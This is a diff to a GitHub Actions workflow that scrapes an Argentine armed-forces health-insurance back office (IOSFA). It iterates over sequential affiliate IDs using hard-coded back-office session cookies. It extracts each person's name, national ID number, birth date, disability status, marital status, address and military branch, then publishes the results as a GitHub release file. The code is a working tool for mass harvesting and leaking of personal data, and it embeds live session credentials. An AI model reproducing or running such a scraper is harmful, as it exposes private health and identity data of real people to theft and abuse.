@@ -16,6 +16,9 @@ on:
         required: true
         default: 'Afiliados-IOSFA'
 
+permissions:
+  contents: write
+
 jobs:
   scrap_and_release:
     runs-on: ubuntu-latest
@@ -24,74 +27,80 @@ jobs:
 
     steps:
       - name: Checkout repository
-        uses: actions/checkout@v3
+        uses: actions/checkout@v4
 
       - name: Run IOSFA scraping
         shell: bash
         run: |
           START=${{ github.event.inputs.start_user }}
           END=${{ github.event.inputs.end_user }}
-          RELEASE_NAME=${{ github.event.inputs.release_name }}
+
+          # 🔐 COOKIES INSERTADAS DIRECTAMENTE
+          COOKIE_HEADER='_gid=GA1.3.2022856683.1771469080; _ga_56029ZBE95=GS2.1.s1771555226$o2$g0$t1771556191$j60$l0$h0; IOSFABackOffice=4368BAD61229F777A3023C951E4620667C6B200FA8E8B28E41124A4D06D59C73AD8FE86E76EB21A44E77FEE334D71C582094EC148D579B56BD76E883CEFA2ABF9D0C30A3FC12C46E3F2B41EF5CB5F2000D361A67851002F1FCB5C1059B3FC59DEB944F04; ASP.NET_SessionId=x4weqd2ynqjb1r4tpyp0tpiu'
+
           echo "Iniciando scraping desde USER $START hasta USER $END"
-          > $OUTPUT
-          
+          > "$OUTPUT"
+
+          extract_input() {
+            echo "$RESPONSE" | grep -oP "$1\"[^>]*value=\"\K[^\"]+" | head -n1
+          }
+
+          extract_span_by_id() {
+            echo "$RESPONSE" | grep -oP "$1\"[^>]*>.*?</span>" | \
+            grep -oP '>\K[^<]+' | head -n1
+          }
+
+          extract_nested_estado() {
+            echo "$RESPONSE" | grep -oP 'frmCabecera_txtEstado[^>]*>.*?estado[^>]*>\K[^<]+' | head -n1
+          }
+
           for USER_ID in $(seq $START $END); do
             echo "Procesando USER $USER_ID"
-            URL="http://validador.iosfa.gob.ar:5080/Afiliados/Titular/Editar/${USER_ID}"
-            RESPONSE=$(curl -s -L "$URL" \
-              -H "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8" \
-              -H "Accept-Language: es-419,es;q=0.9" \
-              -H "User-Agent: Mozilla/5.0" \
-              -H "Cookie: _gid=GA1.3.2022856683.1771469080; _ga_56029ZBE95=GS2.1.s1771555226$o2$g0$t1771556191$j60$l0$h0; IOSFABackOffice=4368BAD61229F777A3023C951E4620667C6B200FA8E8B28E41124A4D06D59C73AD8FE86E76EB21A44E77FEE334D71C582094EC148D579B56BD76E883CEFA2ABF9D0C30A3FC12C46E3F2B41EF5CB5F2000D361A67851002F1FCB5C1059B3FC59DEB944F04; ASP.NET_SessionId=x4weqd2ynqjb1r4tpyp0tpiu") || true
 
-            if [[ "$RESPONSE" != *"FUERZA DE ORIGEN:"* ]]; then
-              echo "USER $USER_ID = SIN DATOS" >> $OUTPUT
+            URL="http://validador.iosfa.gob.ar:5080/Afiliados/Titular/Editar/${USER_ID}"
+
+            RESPONSE=$(curl -s -L "$URL" \
+              -H "User-Agent: Mozilla/5.0" \
+              -H "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8" \
+              -H "Accept-Language: es-419,es;q=0.9" \
+              -H "Cookie: $COOKIE_HEADER" \
+              --max-time 20) || true
+
+            if [[ -z "$RESPONSE" ]] || [[ "$RESPONSE" != *"FUERZA DE ORIGEN:"* ]]; then
+              echo "USER $USER_ID = SIN DATOS" >> "$OUTPUT"
               continue
             fi
 
-            extract() {
-              echo "$RESPONSE" | grep -oP "$1" | head -n1 | sed 's/^[ \t]*//;s/[ \t]*$//'
-            }
+            TIPO=$(extract_input "cboTipoDocumentos_I")
+            APELLIDO=$(extract_input "frmCabecera_txtApellidos")
+            NOMBRE=$(extract_input "frmCabecera_txtNombres")
+            CODIGO=$(extract_input "txtCodigoCredencial_I")
+            DNI=$(extract_input "txtRefExterna")
+            ESTADO_CIVIL=$(extract_input "cboEstadoCivil_I")
+            EDAD=$(extract_input "txtEdad")
+            FECHA_NAC=$(extract_input "txtFecNacimiento_I")
+            DISCAPACIDAD=$(extract_input "cboDiscapacitado_I")
+            VIGENCIA=$(extract_input "txtFecha_Vigencia_I")
+            ALTA_ADMIN=$(extract_input "txtFecha_Alta_Administrativa")
+            PROVINCIA=$(extract_input "cboProvincia_I")
+            LOCALIDAD=$(extract_input "cboLocalidad_I")
+            CALLE=$(extract_input "txtCalle")
+            NUMERO=$(extract_input "frmDomicilio_txtNumero")
 
-            TIPO=$(extract '(?<=cboTipoDocumentos_I\" type=\"text\" value=\").*?(?=\")')
-            ESTADO=$(extract '(?<=ctl00_Content_cbAfiliado_frmCabecera_txtEstado\" style=.*?>).*?(?=</span>)')
-            APELLIDO=$(extract '(?<=frmCabecera_txtApellidos\" value=\").*?(?=\")')
-            NOMBRE=$(extract '(?<=frmCabecera_txtNombres\" value=\").*?(?=\")')
-            CODIGO=$(extract '(?<=frmCabecera_txtCodigoCredencial\" value=\").*?(?=\")')
-            DNI=$(extract '(?<=txtRefExterna\" value=\").*?(?=\")')
-            ESTADO_CIVIL=$(extract '(?<=cboEstadoCivil_I\" type=\"text\" value=\").*?(?=\")')
-            EDAD=$(extract '(?<=txtEdad\" value=\").*?(?=\")')
-            FECHA_NAC=$(extract '(?<=txtFecNacimiento_I\" type=\"text\" value=\").*?(?=\")')
-            DISCAPACIDAD=$(extract '(?<=cboDiscapacitado_I\" type=\"text\" value=\").*?(?=\")')
-            FUERZA=$(extract '(?<=afiFA\">).*?(?=</span>)')
-            VIGENCIA=$(extract '(?<=txtFecha_Vigencia_I\" type=\"text\" value=\").*?(?=\")')
-            ALTA_ADMIN=$(extract '(?<=txtFecha_Alta_Administrativa\" type=\"text\" value=\").*?(?=\")')
-            PROVINCIA=$(extract '(?<=cboProvincia_I\" type=\"text\" value=\").*?(?=\")')
-            LOCALIDAD=$(extract '(?<=cboLocalidad_I\" type=\"text\" value=\").*?(?=\")')
-            CALLE=$(extract '(?<=txtCalle\" value=\").*?(?=\")')
-            NUMERO=$(extract '(?<=frmDomicilio_txtNumero\" value=\").*?(?=\")')
+            FUERZA=$(extract_span_by_id "afiFA")
+            ESTADO=$(extract_nested_estado)
 
-            LINE="TIPO=$TIPO | ESTADO=$ESTADO | APELLIDO=$APELLIDO | NOMBRE=$NOMBRE | CODIGO=$CODIGO | DNI=$DNI | ESTADO_CIVIL=$ESTADO_CIVIL | EDAD=$EDAD | FECHA_NAC=$FECHA_NAC | DISCAPACIDAD=$DISCAPACIDAD | FUERZA=$FUERZA | VIGENCIA=$VIGENCIA | ALTA_ADMIN=$ALTA_ADMIN | PROVINCIA=$PROVINCIA | LOCALIDAD=$LOCALIDAD | CALLE=$CALLE | NUMERO=$NUMERO"
-            echo "$LINE" >> $OUTPUT
+            LINE="USER=$USER_ID | TIPO=$TIPO | ESTADO=$ESTADO | APELLIDO=$APELLIDO | NOMBRE=$NOMBRE | CODIGO=$CODIGO | DNI=$DNI | ESTADO_CIVIL=$ESTADO_CIVIL | EDAD=$EDAD | FECHA_NAC=$FECHA_NAC | DISCAPACIDAD=$DISCAPACIDAD | FUERZA=$FUERZA | VIGENCIA=$VIGENCIA | ALTA_ADMIN=$ALTA_ADMIN | PROVINCIA=$PROVINCIA | LOCALIDAD=$LOCALIDAD | CALLE=$CALLE | NUMERO=$NUMERO"
+
+            echo "$LINE" >> "$OUTPUT"
           done
 
-      - name: Crear release en GitHub
-        uses: actions/create-release@v1
+      - name: Crear release y subir archivo
+        uses: softprops/action-gh-release@v1
         with:
           tag_name: ${{ github.event.inputs.release_name }}
-          release_name: ${{ github.event.inputs.release_name }}
-          body: "Resultados del scraping de IOSFA"
-          draft: false
-          prerelease: false
-        env:
-          GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}
-
-      - name: Subir archivo al release
-        uses: actions/upload-release-asset@v1
-        with:
-          upload_url: ${{ steps.create_release.outputs.upload_url }}
-          asset_path: resultado.txt
-          asset_name: resultado.txt
-          asset_content_type: text/plain
+          name: ${{ github.event.inputs.release_name }}
+          body: "Resultados del scraping IOSFA"
+          files: resultado.txt
         env:
           GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}
